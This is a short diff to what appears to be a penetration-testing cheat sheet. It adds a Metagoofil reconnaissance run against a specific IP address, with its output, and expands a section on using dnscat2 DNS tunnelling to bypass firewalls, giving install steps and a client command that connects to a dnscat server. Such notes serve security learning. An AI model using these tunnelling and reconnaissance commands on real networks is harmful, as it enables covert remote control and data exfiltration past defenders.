@@ -1258,10 +1258,23 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
 # Metagoofil – Metadata collection tool
 
     Note: Metagoofil is a tool for collecting information using Google.
-    python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
+    
+    > metagoofil -w -d 150.107.31.61 -t doc,pdf -l 200 -n 50 -o examplefiles-northernrich
+    [*] Downloaded files will be saved here: examplefiles-northernrich
+    [*] Searching for 200 .doc files and waiting 30.0 seconds between searches
+    [*] Searching for 200 .pdf files and waiting 30.0 seconds between searches
+    [+] Total download: 0 bytes / 0.00 KB / 0.00 MB
+    [+] Done!
+    
 
 # Use a DNS tunnel to bypass the firewall
-
+    
+    https://github.com/iagox86/dnscat2
+    
+    apt install dnscat
+    
+    or
+    
     apt-get update
     apt-get -y install ruby-dev git make g++
     gem install bundler
@@ -1274,4 +1287,5 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
 
     https://downloads.skullsecurity.org/dnscat2/
     https://github.com/lukebaggett/dnscat2-powershell
+    
     dnscat –host <dnscat server_ip>
